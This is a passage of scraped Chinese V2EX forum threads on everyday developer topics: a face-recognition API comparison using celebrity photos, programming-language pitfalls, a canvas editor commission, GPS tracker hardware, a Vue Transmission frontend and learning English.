{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>看图说话\n<img alt=\"\" src=\"http://oioxsopmg.bkt.clouddn.com/Screenshot%20from%202017-02-12%2004-36-01.png\"></p>\n</div></div>"], "reply": "13", "tittle": "专属夜猫子程序员的福利， Github 顶部导航栏在夜晚会变成黑色", "comment": ["楼主反射弧有点长啊。。\r", "隔壁脚本都写好了。。。\r", "发帖之前，养成先搜索应该是一个好习惯吧", "楼主一定是昨天下午起的床", "你这是加入了 AI 的思想来过度解读导航栏变黑这件事", "未登录状态下是白色的", "想太多，昨天下午上的时候就是黑色，。肯定和时间没关系", "不想说什么。。。", "为什么我看到楼主这个帖子莫名想笑", "什么？大清亡了？", "不太想说什么...", "-1s", "这 TM 就尴尬了", "我特么居然笑出了声，楼主也是萌啊"]},
{"content": ["<div class=\"topic_content\">1 ，添加一行文字\r<br>文字可以设置颜色、字体（ Google Fonts ）、变形(已找到符合要求的 JQuery 插件)\r<br>文字可以在画布内自由拖拽位置跟缩放大小\r<br>可以添加多行，并且每一行可以单独设置\r<br>\r<br>2 ，添加图片元素（预先做好的透明 PNG 图片）、或者边框、下划线等\r<br>图片元素要可以自由拖拽位置跟缩放大小\r<br>图片元素能添加多个最好\r<br>\r<br>3 ，给画布选择背景图片（支持上传）\r<br>\r<br>4 ，生成这张文字跟图片组成的最终图片\r<br>\r<br>有大神愿意出手的话给个报价给我，谢谢。</div>"], "reply": "33", "tittle": "前端高手看过来，这个需求能完全用 H5 来做吗？", "comment": ["我貌似在哪见过类似这东西。。。你能出多少钱", "svg", " 预算 3-5K 吧", " 你会做吗😄", "用 Web 技术模仿 PS 嘛", " 差不多吧，能够实现基本的文字图片拼接就可以了，我没有时间去研究，让专业的人做专业的事哈哈", "可以\r", "用 Canvas\r", "3K+\r", "\r", "Mail: b29kb29idmlkZW9AZ21haWwuY29t (Base64)", " 上限最多 5K ？", " 不是说上限最多 5K 吧，我觉得这个项目并不复杂。。。差不多就这个价吧，当然如果我说的太低的话大家完全可以说出来", " 先和 7L 谈吧。。。不行 再 @我", "有现成 flash 版的，所见即所得编辑，要不要", " 好的，谢谢！", " 已发邮件", " 不想要 Flash ，不兼容移动端😄", "感觉这种东西很多吧……", "也可以联系我~", " 好的，先谢谢了", " 感觉而已哈哈", "用 Canvas+html2canvas ，我做过一个和你的需求很像但比你的简单一些的", " 有需要再找你，谢谢😄", "canvas 麻烦点甚至可以用 three", "我开源了一个类似你这样功能的，稍稍改进一下（文字的颜色、字体、变形）就可以，低价帮你做出来阿哈哈", "楼主要兼容移动端的，各位不要漏了这点\r", "pointermove 啥的不能少", "能做，功能 pixijs 这个库里基本都有\r", "\r", "哇喔 这都值 3k? 这钱挺好赚的嘛", "这种鬼东西？", "过年前才弄了一个拍照加素材合成(￣へ￣)", "图片可以看看这个我做的，可以拖拽图片到 Canvas 中，随意缩放， shift 等比例缩放等。矢量图和位图都可以拖。\r", "\r", "\r", "\r", "至于 Canvas 导出图片你可以看看 CCapture 这个库", "fabric.js", " 这个厉害，差不多复合要求了。。。", "兼容移动端其实是有点麻烦的，各种安卓机那是啥稀奇古怪的问题都有", " H5 标准不都是一样的吗？难道在各个安卓版本、型号上不一样？", " 标准是一样，但浏览器的实现有差别呀，比如我们以前做直播，腾讯系的浏览器就不允许任何元素显示在视频上面"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>前不久《最强大脑》第四季第一期的舞台上，王峰对阵小度机器人进行了“人机大战”，其中最精彩和有趣的是第一场 pk---从小时候照片判别长大后对应的人，而她有个姐姐，这对姐妹恰恰是双胞胎！百度真的这么强吗，可以识别出万分之一的区别？\n<img alt=\"\" src=\"https://mmbiz.qlogo.cn/mmbiz_jpg/HaMaLTmc1ovAjLLgxZDPH5wvaPR4woHhXnnxiczlXr9teDKfshOmvkrhbdVIO7nK7dua6icQooO3MntiaYFoyR3Gg/0?wx_fmt=jpeg\">\n有没有办法衡量百度到底有多强，带着这个疑问，我搜到了百度已经开放了他的人脸识别 sdk 。同时作为对比，我选择旷视科技这家公司，因为他们的技术应用在支付宝人脸支付、人脸解锁等场景（<a href=\"https://zhuanlan.zhihu.com/p/21978771\" rel=\"nofollow\">https://zhuanlan.zhihu.com/p/21978771</a>）。作为程序员，撸起袖子马上干起来。\n还要说明下的是，人脸对比是确认一张照片的人和另一张照片的人的相似度，相似度越高说明两个人越像，越低说明两个人不像。大家常见的就是支付宝里的刷脸支付，它的作用和签名验证、指纹验证（上班手指打卡器）一样，确定你是不是你的问题。而人脸对比和最强大脑里的从小时候照片推算出长大后照片有些不同，但目标是一样的，都是看相似性。通过对比人脸识别中人脸对比的准确性，可以知道谁的算法更加强劲。\n百度人脸对比 sdk 入口地址：<a href=\"https://cloud.baidu.com/product/face/compare\" rel=\"nofollow\">https://cloud.baidu.com/product/face/compare</a>\n旷视科技人脸对比入口地址：<a href=\"https://www.faceplusplus.com.cn/face/detect-api.html\" rel=\"nofollow\">https://www.faceplusplus.com.cn/face/detect-api.html</a></p>\n<p>分别注册账号，拿到 api key 和 api secret ，阅读下示例代码。发现 face++的很简单，直接用 curl.exe + MS 命令行。而百度我选择用 python sdk 。由于我用的是免费的接口，旷视的调用次数限制未知，而百度的 api 每天最多 1000 次，他们都对并发不做保证，如果想要商用并且调用次数很多，考虑买个商用授权吧。同时还要说明，试用版和商用版用的效果是一样的，也就是商用版识别结果会和试用版一样，仅仅是次数限制。\nface++对免费 api 的说明：\n并发数有上限且不保证并发：由于资源有限，在调用繁忙的情况下，您的请求有可能会受到并发限制。\nFace 存储有上限：每个用户使用免费服务只能创建 1000 个 FaceSet ，总计最多存储 100 万个人脸。\n一个用户只能有一个 API Key 使用免费服务，而且该 API Key 不能转为正式 API Key 。</p>\n<p>1.首先我想到的是对比下双胞胎辨别能力如何\n从朱佳雯微博提取了 3 张正面照片，从朱佳怡提取 1 张正面图片。\n图片来源：</p>\n<pre><code>蜜蜂少女队-朱佳雯 \nhttp://weibo.com/u/5873198061\nhttp://tva2.sinaimg.cn/crop.0.0.749.749.180/006ptl6Zjw8fa9d1bq3xmj30ku0ktmyd.jpg\nhttp://wx1.sinaimg.cn/mw690/006ptl6Zgy1fc0nme8eapj31ho1zk7wj.jpg\nhttp://wx3.sinaimg.cn/mw690/006ptl6Zgy1fcfsg03fs1j31ho1zkhdv.jpg\n蜜蜂少女队-朱佳怡\nhttp://www.weibo.com/u/5873198101\nhttp://tva3.sinaimg.cn/crop.0.0.749.749.180/006ptl7Djw8fa0yk1bwisj30ku0ktmy7.jpg\n</code></pre>\n<p>face++的识别代码，请将“应用的 API Key ”和“应用的 Secret Key ”分别替换成申请到的字符串。</p>\n<pre><code>set ZJW1=http://tva2.sinaimg.cn/crop.0.0.749.749.180/006ptl6Zjw8fa9d1bq3xmj30ku0ktmyd.jpg\nset ZJW2=http://wx1.sinaimg.cn/mw690/006ptl6Zgy1fc0nme8eapj31ho1zk7wj.jpg\nset ZJW3=http://wx3.sinaimg.cn/mw690/006ptl6Zgy1fcfsg03fs1j31ho1zkhdv.jpg\nset ZJY=http://tva3.sinaimg.cn/crop.0.0.749.749.180/006ptl7Djw8fa0yk1bwisj30ku0ktmy7.jpg\ncurl -X POST \"https://api-cn.faceplusplus.com/facepp/v3/compare\" -F \"api_key=应用的 API Key\" -F \"api_secret=应用的 Secret Key\" -F \"image_url1=%ZJW1%\" -F \"image_url2=%ZJY%\"\ncurl -X POST \"https://api-cn.faceplusplus.com/facepp/v3/compare\" -F \"api_key=应用的 API Key\" -F \"api_secret=应用的 Secret Key\" -F \"image_url1=%ZJW2%\" -F \"image_url2=%ZJY%\"\ncurl -X POST \"https://api-cn.faceplusplus.com/facepp/v3/compare\" -F \"api_key=应用的 API Key\" -F \"api_secret=应用的 Secret Key\" -F \"image_url1=%ZJW3%\" -F \"image_url2=%ZJY%\"\ncurl -X POST \"https://api-cn.faceplusplus.com/facepp/v3/compare\" -F \"api_key=应用的 API Key\" -F \"api_secret=应用的 Secret Key\" -F \"image_url1=%ZJW1%\" -F \"image_url2=%ZJW2%\"\ncurl -X POST \"https://api-cn.faceplusplus.com/facepp/v3/compare\" -F \"api_key=应用的 API Key\" -F \"api_secret=应用的 Secret Key\" -F \"image_url1=%ZJW1%\" -F \"image_url2=%ZJW3%\"\ncurl -X POST \"https://api-cn.faceplusplus.com/facepp/v3/compare\" -F \"api_key=应用的 API Key\" -F \"api_secret=应用的 Secret Key\" -F \"image_url1=%ZJW2%\" -F \"image_url2=%ZJW3%\"\n</code></pre>\n<p>百度识别代码\n安装百度人脸识别包， pip install baidu-aip\n百度识别需要使用本地文件，下载她们的照片，依次命名 zhujiawen 、 zhujiawen2 、 zhujiawen3 和 zhujiayi ，保存到 d 盘下。</p>\n<pre><code># 引入人脸识别 SDK\nfrom aip import AipFace\n# 定义常量 APP_ID = '你的 \nApp ID'API_KEY = '你的 API Key'\nSECRET_KEY = '你的 Secret Key'\n# 初始化 AipFace 对象\naipFace = AipFace(APP_ID, API_KEY, SECRET_KEY)\n# 读取图片\ndef get_file_content(filePath): \n  with open(filePath, 'rb') as fp: \n    return fp.read()\n\naipFace.match([get_file_content('d:/zhujiawen.jpg'),get_file_content('d:/zhujiayi.jpg'),])\naipFace.match([get_file_content('d:/zhujiawen2.jpg'),get_file_content('d:/zhujiayi.jpg'),])\naipFace.match([get_file_content('d:/zhujiawen3.jpg'),get_file_content('d:/zhujiayi.jpg'),])\naipFace.match([get_file_content('d:/zhujiawen.jpg'),get_file_content('d:/zhujiawen2.jpg'),])\naipFace.match([get_file_content('d:/zhujiawen.jpg'),get_file_content('d:/zhujiawen3.jpg'),])\naipFace.match([get_file_content('d:/zhujiawen2.jpg'),get_file_content('d:/zhujiawen3.jpg'),])\n</code></pre>\n<p>图片如下（前三章朱佳雯，后一张朱佳怡）：\n<img alt=\"\" src=\"https://mmbiz.qlogo.cn/mmbiz_png/HaMaLTmc1ovm1NKxmDibsvLrM3nfKI6IpFB1dKImBw1fXPkNyJXBfpwQicX2uQOlIwr43y7sAbvy0lNWDibOnBmeA/0?wx_fmt=png\">\n对比结果如下（数值越高越相似）：</p>\n<p>|表 1|人脸对比结果|\n|----|----|----|----|----|\n|序号|图片 1|图片 2|face++|百度|\n|1|朱佳雯 1|朱佳怡|88.804|93.915|\n|2|朱佳雯 2|朱佳怡|84.242|94.210|\n|3|朱佳雯 3|朱佳怡|79.859|93.574|\n|4|朱佳雯 1|朱佳雯 2|\t84.716|93.172|\n|5|朱佳雯 1|朱佳雯 3|87.825|92.108|\n|6|朱佳雯 2|朱佳雯 3|83.453|92.042|</p>\n<p>这个是百度运行结果，可以参考下：\n<img alt=\"\" src=\"http://upload-images.jianshu.io/upload_images/1383751-ebd4b31b024eb306.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p>我们观察数据，分析下：\n1 ）序号 1 、序号 2 的数值都比序号 6 大，这意味着双胞胎的相似度有时高过自己与自己的相似度。这说明，最强大脑中，小度可能真的是运气好，蒙对了！\n2 ）百度的数据比较集中，在 92~95 之间，而 face++数据在 79~89 之间。这说明百度的算法可能比较准确。（双胞胎确实像啊，怎么 face++范围波动那么大？）\n3 ）观察最大值， face++在 1 （人不同）和 5 （同一个人）时数值最大，百度在 1 （人不同）和 2 （人不同）数值最大。 face++比百度稍微好些。\n4 ）观察最小值， face++序号 3 （不同人）最小，百度序号 6 最小（同一人）。 face++比百度好。\n对比双胞胎，双方确实都有问题。要说谁好一些，我投 face++一票。\n2.可能你说上一回合，各有错误，而每张照片差别太大（清晰度、时间、光照、妆容都不一样）。那么同一个人在同一时间段的照片分别对比（人脸表情、朝向不同），看看相似性是不是应该很高。\n这次换王珞丹，从她的微博弄下 5 张图，分别用第 1 张与后 4 张进行对比：\n王珞丹</p>\n<pre><code>http://ww2.sinaimg.cn/mw1024/49393842jw1f8wne2olizj22as3g6u0x.jpg\nhttp://ww1.sinaimg.cn/mw1024/49393842jw1f8wnejo9tyj22as3g6u0y.jpg\nhttp://ww4.sinaimg.cn/mw1024/49393842jw1f8wne9yic3j22as3g6qv6.jpg\nhttp://ww3.sinaimg.cn/mw1024/49393842jw1f8wndxibndj22as3g6qv5.jpg\nhttp://ww3.sinaimg.cn/mw1024/49393842jw1f8wnee6krdj22as3g6qv6.jpg\n</code></pre>\n<p><img alt=\"\" src=\"https://mmbiz.qlogo.cn/mmbiz_png/HaMaLTmc1ovm1NKxmDibsvLrM3nfKI6IpibjtLzYJntVZZb834zEsXojtD4SvhuFddma6YBXlZ01uShXZIw6POVA/0?wx_fmt=png\"></p>\n<p>对比代码：\nface++的</p>\n<pre><code>set WLD1=http://ww2.sinaimg.cn/mw1024/49393842jw1f8wne2olizj22as3g6u0x.jpg\nset WLD2=http://ww1.sinaimg.cn/mw1024/49393842jw1f8wnejo9tyj22as3g6u0y.jpg\nset WLD3=http://ww4.sinaimg.cn/mw1024/49393842jw1f8wne9yic3j22as3g6qv6.jpg\nset WLD4=http://ww3.sinaimg.cn/mw1024/49393842jw1f8wndxibndj22as3g6qv5.jpg\nset WLD5=http://ww3.sinaimg.cn/mw1024/49393842jw1f8wnee6krdj22as3g6qv6.jpg\ncurl -X POST \"https://api-cn.faceplusplus.com/facepp/v3/compare\" -F \"api_key=应用的 API Key\" -F \"api_secret=应用的 Secret Key\" -F \"image_url1=%WLD1%\" -F \"image_url2=%WLD2%\"\ncurl -X POST \"https://api-cn.faceplusplus.com/facepp/v3/compare\" -F \"api_key=应用的 API Key\" -F \"api_secret=应用的 Secret Key\" -F \"image_url1=%WLD1%\" -F \"image_url2=%WLD3%\"\ncurl -X POST \"https://api-cn.faceplusplus.com/facepp/v3/compare\" -F \"api_key=应用的 API Key\" -F \"api_secret=应用的 Secret Key\" -F \"image_url1=%WLD1%\" -F \"image_url2=%WLD4%\"\ncurl -X POST \"https://api-cn.faceplusplus.com/facepp/v3/compare\" -F \"api_key=应用的 API Key\" -F \"api_secret=应用的 Secret Key\" -F \"image_url1=%WLD1%\" -F \"image_url2=%WLD5%\"\n</code></pre>\n<p>百度的（还是一次下载图片，保存为 wangluodan1 、 wangluodan2 、 wangluodan3 、 wangluodan4 、 wangluodan5 ）</p>\n<pre><code>aipFace.match([get_file_content('d:/wangluodan1.jpg'),get_file_content('d:/wangluodan2.jpg'),])\naipFace.match([get_file_content('d:/wangluodan1.jpg'),get_file_content('d:/wangluodan3.jpg'),])\naipFace.match([get_file_content('d:/wangluodan1.jpg'),get_file_content('d:/wangluodan4.jpg'),])\naipFace.match([get_file_content('d:/wangluodan1.jpg'),get_file_content('d:/wangluodan5.jpg'),])\n</code></pre>\n<p>对比结果如下（数值越高越相似）：</p>\n<p>|表 2|人脸对比结果|\n|----|----|----|----|----|\n|序号|图片 1|图片 2|face++|百度|\n|1|王珞丹 1|王珞丹 2|88.973|95.826|\n|2|王珞丹 1|王珞丹 3|94.752|98.096|\n|3|王珞丹 1|王珞丹 4|81.722|93.068|\n|4|王珞丹 1|王珞丹 5|80.724|94.447|</p>\n<p>果不其然， face++的相似度范围来去太大，而百度依旧十分稳定！这一回合百度完胜。可以看到 face++在人脸发生很大的旋转、表情发生变化时，数值波动增大，识别效果不如百度。这一回合毋庸置疑，我投百度一票。\n最后在看一下不同的人的对比：</p>\n<p>|表 3|人脸对比结果|\n|----|----|----|----|----|\n|序号|图片 1|图片 2|face++|百度|\n|1|朱佳雯 1|王珞丹 1|59.221|53.006|</p>\n<p>再一次看到对于不同的人，百度的相似度更低。百度能在同样的人的对比中，相似度更高，而在不同人对比中，相似度更低，这一回合我投百度一票。最终还是百度更强，说明百度的人脸识别应该是国内最强。</p>\n<ul>\n<li>文章仅从少量数据分析，如果要更强说服力，需要拿更多的图片对比。</li>\n<li>文章可以分享，谢绝转载。</li>\n<li>文中图片皆来自互联网，侵权立删。\n若想阅读更多的文章请关注微信公众号：\n<img alt=\"\" src=\"http://upload-images.jianshu.io/upload_images/1383751-4fa0e746ff7cee70.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></li>\n</ul>\n</div></div>"], "reply": "10", "tittle": "国内人脸识别公司哪家强，人脸比对跑个分比较下！", "comment": ["不知道为啥表格画不出来，看表格还是去我原网站吧， ", "python 也可以不下载 sdk 用的 , 乘机水一发我写的 ", " 下载 sdk 只是少让自己写代码，你这个应该还是要 https 网络通信的（下载了你的更不容易搞出识别了把~）", " 要有理有据啊，都用的 baidu api ，凭啥说我的不容易搞识别？来你说个功能，一起玩玩？网络传输写好以后可以直接让别人体验，你这 sdk 打包先不说要考虑平台的兼容性，别人就算想试试你这源码都得跑去下载 sdk ，想想都麻烦", " 下载了你的更不容易搞出识别了把--------你的一样得下载你的代码运行啊，和一行指令下载库有多少区别吗。我是 python 初学者不会 django ，不想安装那么大的库。容易的意思你理解错了。", "用名人的照片，这没有意义", " 一般他们用于训练的人脸的库因为版权，不会用到明星的。再者，这些是明星近期的图片，不会存在与他们本身的数据库里。", " 我就不说话， ", " 去用用", " 昨天就用过了，效果一样。可是我还是觉得我这个简单~", "  哦，你高兴就好"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>楼主昨天写 PHP 就碰到 PDO 扩展的一个大坑，详情 <a href=\"https://segmentfault.com/q/1010000008305175\" rel=\"nofollow\">https://segmentfault.com/q/1010000008305175</a></p>\n<blockquote>\n<p>PDO 的参数绑定 bindParam 方法第二个参数是传递一个引用类型，而不是值，因为这个问题我前天晚上反反复复调试了半天，甚至去各大 PHP 群里面问了一些\"资深大牛\"都说不知道，看来现在的程序员确实都是用多了框架都忘记了 PHP 原生的各种坑啊。</p>\n</blockquote>\n<p>还有 JavaScript 的 this 指向也让很多初学者摸不着头脑，不过这貌似是函数式编程语言的特性把，不知道算不算一种坑呢？</p>\n<p><strong>话说别的编程语言有类似的坑吗？各位可以分享分享</strong></p>\n</div></div>"], "reply": "81", "tittle": "你们觉得哪个编程语言的坑最多？", "comment": ["JS 的 callback hell 算吗?laravel:从入门到重装虚拟机；没有虚拟机环境， migragte 用不上，", "php 和 js", "c++", "python 之外的任何语言", "this 和 functional 有何关系？", "文档中参数有&符号的，表明是引用传递。\r", "\r", "这怎么能叫坑呢，明显是卤煮没有仔细看文档。", "引用传递特点有仨：\r", "函数会修改变量本身；\r", "不能传具体值，比如 func(12)，如果 func 第一个参数是引用的话；\r", "不会新开辟内存，这应该都知道。", "AS3 （ Flash ）。编译器都不稳定。早期版本编译一个包里面元素多了就不能成功打包，需要拆成两个包。\r", "后来的版本经常有语法错误检查不出来能够成功编译，运行时候报错的问题（调用栈下溢听说过么）。或者偶尔出现代码完全没问题编译出来的程序运行时报错，重新编译就好了的问题。", "js ，因为运行你代码的环境你不能控制", "坑最少的肯定是 java ，但是人们总是嫌弃它。", " 我很少去查官方文档和用 ide ，由于现在还没工作，写 php 都是做点小东西玩玩。", "而且 pdo 作者为什么要把这个参数弄成引用传递？", " 因为我访问 ", " 很慢， w3c 也一样（因为 w3c 他引用了一个谷歌字体，我又没改过 hosts ），想问问国内还有什么比较快的在线查 php 以及常用扩展 api 的地方？", "golang 昨天遇到一个 xml unmarshal 的时候  namespace 会莫名其妙消失的 bug   官方的 issue 现在还开着   还好用第三方包解决了！", "c++", "人\r", "脑残不能怪机器\r", "人傻不能怨语言", "Java 的 Swing 。。。", "大部分较流行的语言，都有很多水货码农，碰到这样的同事坑最多。", "this 是 oop 的啊", "this 只是作用域啊……", "代码质量因人而异，别把锅甩给语言", "this 奇怪的地方是因为人们误认为 JS 是 Class-based OOP 语言（比如 Java ），但 Javascrit 其实是 Prototype-based.  与其说是“坑”， 不如说是“特性”...", "js 的 this 其实有一套很好的解决方案了， jquery 把所有的事件都绑定当前触发的元素作为 this ，然后虚拟了一个 data 方法直接可以在元素上“放”数据，这样只要元素对数据就肯定对\r", "可惜大神都鄙视 jQuery ，喜欢闭包什么的", " 估计你没用过 javafx", "要是能把坑填上，坑多坑小都不是问题", "Lua", "不是我说啥，碰到问题了都不好好看官方文档，换什么语言都没的治\r", "\r", "还有这种发帖的思路，你觉得你这样发帖，下面会出现有助于你的内容么？", "查一下最终执行 sql ，再查一下 php 函数说明，就明白怎么回事了", "楼主和我一样, 把不认真阅读文档当做坑.", "这个在 stackoverflow 上 vote 很高的，一开始是为了性能吧，后来为了兼容性就不改了。。。有很多有问题的函数在 php7 里面都留下来了，比如 parse_str 的覆盖全局变量的危险做法", "php 的 unserialize 就是坑，估计以后还会爆漏洞\r", "\r", "别的坑的话，我暂时想不到了", "第一名 C++，第二名 JS ，另外楼主，你这哪叫坑，你这分明是自己没认真看文档。我说的这两个，里面坑有些你去翻文档都翻不到，放狗搜半天才在某个叫角落里找到类似，“这是编译器实现问题”，“这是历史遗留问题”的坑", "js 吧,灵活性越高的语言坑越多", "js 应该不是坑最多的，不过确实有一些坑，毕竟是 10 天做出来的。不过好在来一次新 ES 就填不少坑。不过 this 这个和函数式没什么关系。", "坐等说 python 的编码", "js 为首", "js......", "js", "C++、 Javascript 一定榜上有名", " 这个还好吧，统一编码就好了，而且 3 已经把坑填了。", "如果单说语言，抛开开发环境与语言生态来看是： JS\r", "\r", "如果全带上，我选.NET ，对于 .NET 微软的坑太多。", "js 语法糖(keng)太多了", "C\r", "编译器扩展，不同标准，各种未定义，各种优化，各种硬件相关，。。。。", "汇编", "有 go 语言坑么？啥玩意都要自己整一套，写起来真是蛋疼死", " callback hell 是 ES5 时代的坑，现在都快 ES7 了...", "js 挺好的，坑不多吧，理解 this ,原型链，闭包等一些概念， js 完全不是问题", "C++", "综上所述，人们习惯把自己不懂又不懒得去搞懂的知识点称之为坑。", "JavaScript 还好吧。新的 ES2015 、 ES6 和 ES7 所加的大部分特性也只是语法糖而已，基本就是读文档就能学会的东西；只有少数的东西去要专门花时间理解。", "对了其实楼主说的这一点是不对的：\r", "\r", " > 还有 JavaScript 的 this 指向也让很多初学者摸不着头脑，不过这貌似是函数式编程语言的特性把，不知道算不算一种坑呢？\r", "\r", "函数式语言的特征不是 this 指针的搞法……而是纯函数、副作用、高阶函数、柯里化那些东西，更不用说诸如 monad 、 dependent type 这些东西了。\r", "\r", "JavaScript 能算函数式语言特征的就是 function as first class 和闭包。", "二战梗：“你粉哪个国家，取决于对哪个国家了解更少”", "js", " #22 jquery 最大问题在于完全思路完全基于 DOM ，没有可控的组件化机制，业务代码与 UI 代码完全耦合，相比与通过特定接口交互所设计的组件，不利于多人协作以及相对复杂的页面交互场景。\r", "this 应该是做 OO 时用的，原型函数内定义的函数使用箭头函数就可以了，而不是 jquery 这种把 this 指向元素的做法，不是说操作元素就不好，而是这种方式如果跟面向对象的 UI 设计混用会很容易导致混乱。", " #40 +1", " 在那个年代这不是个问题，是现在前端要秒天秒地秒空气，通杀一切 UI 部分，这个还需要 webasm 来终结\r", "我要的是 JAVAscript 不是那个四不像的 es6 es7 什么\r", "\r", "讲个笑话， javascript 有 oo ？\r", "那个箭头函数我认为是个败笔， js 小黄书关于 this 那本讲了 this 的四个原则，就是教你怎么去看 this 是啥，你设计太奇葩，大家都学会没啥了\r", "突然你又把 this 从运行时改成语义化，这就很操蛋了\r", "类似的还有循环类函数对 undefined 的处理", "Java 的 swing +1", "PHP 是最好的语言，怎么能说有坑呢？\r", "我觉得最坑的是 SHELL ，其次是 JS", "在用过的当中， shell 最坑，无比难用，习惯了 Python 在用这玩意真是痛苦", "比坑的话， c++一出，谁与争锋", " 更正一下，是对 array 空白位的处理", " 觉得 python 编码坑的大概还停留在 2.x ，而且不会__future__吧", "c++:你们都是来争第二的么？", "函数式没有 this,this 是 OOP 的,ES6 以后 JS 就没啥大坑了", "同事", "要说语言 PLC 用的 STL 和 LAD 还有高级的 SCL ，坑是最少的，每个指令要得到的信息都是已知的，好多是硬件实现的\r", "\r", "语言这个东西 看使用场合吧", " 虽然 js 坑是挺多的。。但是现在（ 2017 年）还在抱怨 callback hell 实在是没说到点子上", "bash ，语法格式各种反人类，不折腾一圈根本写不出东西来，写完的都留着不敢删因为没法保证还能再写出来", "php.. 最坑了。。", " 每一个函数下面的用户评论，被顶起来的很多都是说这个函数有什么坑的", "人说的话最坑……", "居然没人提 Scala 啊，失望。\r", "果然是没人用么。。。", "js", "py2 编码坑", "这叫坑？文档里有写清楚的能叫坑？", "js 反正是奇技淫巧最多的语言   语言层面上历史遗留的问题就很多   有的坑还入了标准", " 所以结论是你比较适合那个时代？", " 昨天看到一个笑话图， es3 的精髓是那么多， es6 的精髓还是跟 es3 一样多，实际上除了 es5 的 get/set 方法绑定之外，其余的都是跑在 polyfill 上的\r", "\r", "用 java 的没说用 java8 鄙视用 apache utils 的，但是前端文章动不动不用 es6 你就 xx 一样的标题", "python?\r", "项目一大各种耦合搞死你", "我会的语言不多，但据说是 C++\r", "\r", "我用 perl 用得神清气爽我会乱说？", " 说来听听，看看我遇到过没有~"]},
{"content": ["<div class=\"topic_content\">这个有没有这种功能的设备呢？现在搞的头都大了。\r<br>开发 APP ，太耗手机电了。</div>"], "reply": "22", "tittle": "有没有现成的 gps 定位硬件，主要需要 5 分钟向我服务器发送位置信息，做打车系统用", "comment": ["物联网很多这样的集成模块 某宝都有", " 我去找过，但是最好就是很简单的功能，可以 post 到数据库就够了", "关键通信怎么搞？走 4G ？", " 不一定走 4g  走 E 网应该就够用了 插个 SIM 卡", "某宝关键词  智能单车  2G gps", "车载 GPS", "现在在开发什么打车软件，感觉已经进入行业成熟期了都", "叫硬件加一个单片机定制开发一个啊，直接 http 或者 tcp 到服务器，不过现在还开发打车应用？", "找一辆膜拜单车，  拆开，看人家怎么弄的，照葫芦画瓢。。。", "这个需要多少量", "  谢谢\r", " 谢谢\r", "  谢谢\r", "  谢谢\r", "   谢谢\r", " 每个月 30 套左右", "淘宝， gps 模块， gprs 模块", "可以看看这个 ", ", 专业做这方面的", "GPS 集成 GSM 模块有现成的，需要用单片机写一点点代码就可以跑", "通信我搞过一点，推荐 SIMCOM 公司的（国内外都很流行他们的产品，非常成熟）。按照你的需求，可以选最便宜的。\r", "\r", "这里是我搞 SIM900A 的一些记录和照片：\r", "\r", "\r", "（我没弄过 GPS ）", "我们有 OBD 接口模块，带 GPS ，带 GPRS ，可直接提供车辆位置和总线故障信息。", "一般这种需求可以找芯片公司给你设计一套 SOC 搞定，想手工打造搞个树莓派这种也可以", " 多少钱", " 嗯 多少钱一套", " 楼主似乎没有硬件团队，那就得找做这块的公司，签好合同，让他们去搞。具体多少钱，我也不知道。", "  零售价格 398/个，含一年 GPRS 流量费"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h3>起因：</h3>\n<pre><code>transmission 的官方前端在移动端无法点出菜单，导致部分功能在手机上无法使用，例如校验种子。\n官方前端使用的技术太陈旧\n项目十分适合用 VUE 来折腾\n</code></pre>\n<h3>结果：</h3>\n<pre><code>学会了 vue 开发，副产品就是这个 transmission 前端\n\ngithub: https://github.com/k9982874/transmission-vue\n</code></pre>\n<h3>注意：</h3>\n<pre><code>github 上的并不是源代码，只是 build 之后的输出文件。至于是否开源看我心情，不喜勿下。\n</code></pre>\n<h3>存在的问题：</h3>\n<pre><code>错误处理做的太糙\n翻译文本还有缺失\n部分功能缺失\n</code></pre>\n<h3>食用方法：</h3>\n<pre><code>找到 transmission 官方 web 目录，把所有文件扔进去，完事。\n官方 web 目录一般在 /usr/share/transmission/web\n</code></pre>\n<p><img alt=\"截图\" src=\"http://i.imgur.com/OdGPsJp.png\"></p>\n</div></div>"], "reply": "8", "tittle": "2017 第一弹，使用 vue 开发了一个 transmission 前端", "comment": ["感谢 很有趣的东西～", "这头像是辐射避的人物，嘿嘿", "赞一个", "Source Map 都放出来了，还「至于是否开源看我心情」..\r", "\r", " ", "  \r", "\r", "不是很懂你们.. ", " ", " 哈哈", "我的哥， sourcemap", " 忘记删掉了。脸真疼，哈哈哈", "趁着这贴还新问个问题\r", "transmission 显示文件大小的时候是按 MB 算的，而不是 MiB ，这就导致显示的文件大小比实际要大，怎么改成 1024 倍数这种的单位"]},
{"content": ["<div class=\"topic_content\">现在还有什么渠道来获取微博用户的在线状态么， 渣浪的 openapi 挂好久了，然后网上的老版搜索页面的 usercard 的在线状态也不能用了。\r<br>但是某些追星的 APP 似乎还可以抓取到用户的状态，他们是通过啥方法获取的呢？</div>"], "reply": "目前尚无回", "tittle": "微博用户的在线状态获取", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>知乎答案的排序算法是怎样设计的呢？怎样保证优秀答案不被湮没？</p>\n</div></div>"], "reply": "1", "tittle": "谁了解知乎的排序算法，求教！", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本来英语也不咋地</p>\n<p>平时工作中看一些文档资料也相对吃力，反正就是凑和看。然而，逻辑稍微复杂一些 就肯定懵逼！</p>\n<p>口语更是垃圾，属于完全张不开嘴型。即便张嘴了 也就是 how are you ？ fine thank you and you ？的水准（稍夸张了哈）努力一下 也就是 chinglish+京腔（you eat 胸柿炒鸡蛋） 外加一股大碴子味儿（you 嘎哈呀）</p>\n<p>当然知道语境很重要，但是面对目前的情况与祖国56个民族花朵 栋梁共事交流，中文不跑音都谢天谢地了。。。</p>\n</div></div>"], "reply": "132", "tittle": "V 友都是如何学习（加强）英语能力的？", "comment": ["看无字幕公开课", "语言改变一个人的思维方式，你满脑子都在用英语思考了，那配合上一般的学习强度，进步会很快啊……我不说我英语很好 但是一般看外文网站 听新闻 看美剧啥的 是基本没有太大压力了，每天动不动就英语自言自语 脑子里也是 有点神经质的感觉了，各种复述喜欢的台词或者看到的喜欢的句子。", "交个英语国家的基友或女友", " 酷！赞！", " 酷！\r", "这是一个很好的现象！\r", "\r", 